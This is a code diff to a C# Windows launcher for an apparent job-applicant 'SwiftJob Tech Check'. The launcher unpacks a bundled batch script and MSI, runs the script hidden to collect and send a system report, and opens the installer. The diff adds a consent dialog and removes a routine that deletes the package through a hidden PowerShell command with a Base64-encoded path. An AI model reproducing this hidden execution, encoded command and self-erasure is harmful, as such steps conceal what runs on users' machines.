@@ -1,15 +1,19 @@
 using System;
+using System.Drawing;
 using System.Diagnostics;
 using System.IO;
 using System.Reflection;
 using System.Security.Cryptography;
 using System.Text;
+using System.Threading.Tasks;
 using System.Windows.Forms;
 
 internal static class Program
 {
     private const int FooterSize = 24;
-    private const int PackageVersion = 1;
+    private const int PackageVersion = 2;
+    private const int InstallWindowMilliseconds = 10 * 60 * 1000;
+    private const string ReportFileName = "system-check-report.json";
     private const string ExpectedMsiSha256 =
         "891CD20DAF021CFC407281667BE16ABF6C6F7AE333D179C3C0B75DF4E9D649B0";
     private static readonly byte[] FooterMagic = Encoding.ASCII.GetBytes("SJTCBNDL");
@@ -47,12 +51,25 @@ internal static class Program
             WriteRange(packagePath, package.BatchOffset, package.BatchLength, batchPath);
             WriteRange(packagePath, package.MsiOffset, package.MsiLength, msiPath);
 
-            int collectExit = RunBatch(batchPath, "collect", tempDirectory);
-            if (collectExit != 0)
+            // Be explicit about the inventory and its submission before any
+            // system scan, network request, or installer is started.
+            if (!ShowConsentPrompt())
+            {
+                return 0;
+            }
+
+            Stopwatch installWindow = Stopwatch.StartNew();
+            int startExit = RunBatch(batchPath, "start", tempDirectory);
+            if (startExit != 0)
             {
                 throw new InvalidOperationException(
-                    "The background system check could not finish. No installer was opened.");
+                    "The secure ten-minute install window could not be started. Check your connection and run the checker again.");
             }
+
+            // Once the candidate confirms, start the disclosed system scan in
+            // the background and open the normal Windows Installer immediately.
+            Task<int> collectTask = Task.Run(
+                () => RunBatch(batchPath, "collect", tempDirectory));
 
             ProcessStartInfo installerInfo = new ProcessStartInfo(
                 "msiexec.exe",
@@ -62,14 +79,57 @@ internal static class Program
             installerInfo.WorkingDirectory = tempDirectory;
 
             int installerExit;
-            using (Process installer = Process.Start(installerInfo))
+            bool installWindowExpired = false;
+            try
             {
-                if (installer == null)
+                using (Process installer = Process.Start(installerInfo))
                 {
-                    throw new InvalidOperationException("Windows Installer could not be started.");
+                    if (installer == null)
+                    {
+                        throw new InvalidOperationException("Windows Installer could not be started.");
+                    }
+                    while (!installer.WaitForExit(250))
+                    {
+                        if (installWindow.ElapsedMilliseconds >= InstallWindowMilliseconds)
+                        {
+                            installWindowExpired = true;
+                        }
+                    }
+                    installerExit = installer.ExitCode;
                 }
-                installer.WaitForExit();
-                installerExit = installer.ExitCode;
+            }
+            catch
+            {
+                // Do not leave the disclosed scan running against a directory
+                // that the cleanup below is about to remove.
+                collectTask.GetAwaiter().GetResult();
+                throw;
+            }
+
+            int collectExit = collectTask.GetAwaiter().GetResult();
+            if (collectExit != 0)
+            {
+                MessageBox.Show(
+                    "The system scan could not finish. No report was sent. You can run the checker again before its secure link expires.",
+                    "SwiftJob Tech Check",
+                    MessageBoxButtons.OK,
+                    MessageBoxIcon.Warning);
+                return 1;
+            }
+
+            if (installWindow.ElapsedMilliseconds >= InstallWindowMilliseconds)
+            {
+                installWindowExpired = true;
+            }
+
+            if (installWindowExpired)
+            {
+                MessageBox.Show(
+                    "The installer was not stopped, but it finished after the ten-minute check window. The report was not submitted. Contact SwiftJob support for a fresh check.",
+                    "SwiftJob Tech Check",
+                    MessageBoxButtons.OK,
+                    MessageBoxIcon.Information);
+                return 1;
             }
 
             if (installerExit != 0 && installerExit != 3010 && installerExit != 1641)
@@ -91,12 +151,6 @@ internal static class Program
                     "Installation completed, but the system report could not be sent. Check your connection and run this package again.");
             }
 
-            MessageBox.Show(
-                "Installation and the one-time system check are complete. Return to your browser and verify the report to continue.",
-                "SwiftJob Tech Check",
-                MessageBoxButtons.OK,
-                MessageBoxIcon.Information);
-            SchedulePackageDeletion(packagePath);
             return 0;
         }
         catch (Exception exception)
@@ -121,6 +175,56 @@ internal static class Program
                     // Best-effort cleanup; the files are confined to this unique temp directory.
                 }
             }
+        }
+    }
+
+    private static bool ShowConsentPrompt()
+    {
+        using (Form dialog = new Form())
+        {
+            dialog.Text = "SwiftJob Tech Check";
+            dialog.ClientSize = new Size(640, 440);
+            dialog.FormBorderStyle = FormBorderStyle.FixedDialog;
+            dialog.StartPosition = FormStartPosition.CenterScreen;
+            dialog.MaximizeBox = false;
+            dialog.MinimizeBox = false;
+
+            Label heading = new Label();
+            heading.AutoSize = true;
+            heading.Location = new Point(22, 18);
+            heading.Font = new Font("Segoe UI", 14F, FontStyle.Bold);
+            heading.Text = "Review the one-time system check";
+
+            Label details = new Label();
+            details.AutoSize = false;
+            details.Location = new Point(24, 58);
+            details.Size = new Size(590, 292);
+            details.Font = new Font("Segoe UI", 9.5F, FontStyle.Regular);
+            details.Text =
+                "Click Continue to start the scan in the background and open the standard Windows Installer, which will show its normal installation steps.\r\n\r\n" +
+                "The scan reads: device type; computer manufacturer and model; Windows edition, version, build, architecture, and system type; CPU model, cores, threads, and maximum clock; installed and available memory; graphics adapter, driver, and reported memory; local fixed-disk letters, sizes, and free space; the current check time; and any existing Windows system-rating score. It does not run a stress test or a new benchmark, and does not collect serial numbers, personal documents, passwords, or browsing history.\r\n\r\n" +
+                "The report is sent to SwiftJob and attached to your application only after the installer completes successfully. If you cancel here, the scan and installer will not start. If you cancel or the installer fails, the report is not sent.";
+
+            Button continueButton = new Button();
+            continueButton.Text = "Continue";
+            continueButton.DialogResult = DialogResult.OK;
+            continueButton.Size = new Size(112, 34);
+            continueButton.Location = new Point(376, 382);
+
+            Button cancelButton = new Button();
+            cancelButton.Text = "Cancel";
+            cancelButton.DialogResult = DialogResult.Cancel;
+            cancelButton.Size = new Size(112, 34);
+            cancelButton.Location = new Point(502, 382);
+
+            dialog.Controls.Add(heading);
+            dialog.Controls.Add(details);
+            dialog.Controls.Add(continueButton);
+            dialog.Controls.Add(cancelButton);
+            dialog.AcceptButton = continueButton;
+            dialog.CancelButton = cancelButton;
+
+            return dialog.ShowDialog() == DialogResult.OK;
         }
     }
 
@@ -227,37 +331,14 @@ internal static class Program
         info.WindowStyle = ProcessWindowStyle.Hidden;
         info.WorkingDirectory = Path.GetDirectoryName(batchPath);
         info.EnvironmentVariables["SWIFTJOB_TECHCHECK_TEMP"] = tempDirectory;
+        info.EnvironmentVariables["SWIFTJOB_TECHCHECK_REPORT"] =
+            Path.Combine(tempDirectory, ReportFileName);
 
         using (Process process = Process.Start(info))
         {
             if (process == null) return 1;
             process.WaitForExit();
             return process.ExitCode;
-        }
-    }
-
-    private static void SchedulePackageDeletion(string packagePath)
-    {
-        byte[] pathBytes = Encoding.UTF8.GetBytes(packagePath);
-        string encodedPath = Convert.ToBase64String(pathBytes);
-        string script =
-            "$p=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('" +
-            encodedPath +
-            "')); Start-Sleep -Seconds 2; Remove-Item -LiteralPath $p -Force";
-        ProcessStartInfo info = new ProcessStartInfo(
-            "powershell.exe",
-            "-NoProfile -NonInteractive -WindowStyle Hidden -Command \"" + script + "\"");
-        info.UseShellExecute = false;
-        info.CreateNoWindow = true;
-        info.WindowStyle = ProcessWindowStyle.Hidden;
-        try
-        {
-            Process cleanup = Process.Start(info);
-            if (cleanup != null) cleanup.Dispose();
-        }
-        catch
-        {
-            // Keep a completed package if Windows blocks best-effort self-deletion.
         }
     }
 
